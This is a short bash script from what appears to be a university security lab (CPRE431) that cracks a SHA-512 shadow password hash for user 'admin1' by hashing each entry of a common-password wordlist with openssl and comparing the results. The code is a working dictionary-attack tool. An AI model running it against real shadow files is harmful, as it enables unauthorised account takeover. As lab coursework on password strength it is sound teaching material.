#!/bin/bash
# =============================================
# PASSWORD CRACKER - CPRE431 Lab
# Cracking admin1 password
# =============================================

WORDLIST="100k-most-used-passwords-NIST.txt"
SHADOW_HASH='$6$xgLS35S6$2UjEq.dUhICPw9zgDVJXcQYQp/9ilLPQt/8Zgu0uwngI5mVvB1eKQG9SnVLjmOOfkB4Jjb5VSAXGXjY4Cf5k90'

ALGO=$(echo "$SHADOW_HASH" | cut -d'$' -f2)
SALT=$(echo "$SHADOW_HASH" | cut -d'$' -f3)

# Fix Windows line endings
sed -i 's/\r//' "$WORDLIST"

echo "============================="
echo " User      : admin1"
echo " Algorithm : SHA-512"
echo " Salt      : $SALT"
echo " Cracking..."
echo "============================="

COUNT=0
while IFS= read -r PASS; do
    [[ -z "$PASS" ]] && continue
    COUNT=$((COUNT+1))

    GEN=$(openssl passwd -6 -salt "$SALT" "$PASS" 2>/dev/null)

    (( COUNT % 1000 == 0 )) && echo -ne "[*] Tried $COUNT passwords...\r"

    if [[ "$GEN" == "$SHADOW_HASH" ]]; then
        echo ""
        echo "============================="
        echo "[+] PASSWORD FOUND: $PASS"
        echo "[+] Total tried   : $COUNT"
        echo "============================="
        exit 0
    fi
done < "$WORDLIST"

echo ""
echo "[-] Password not found"
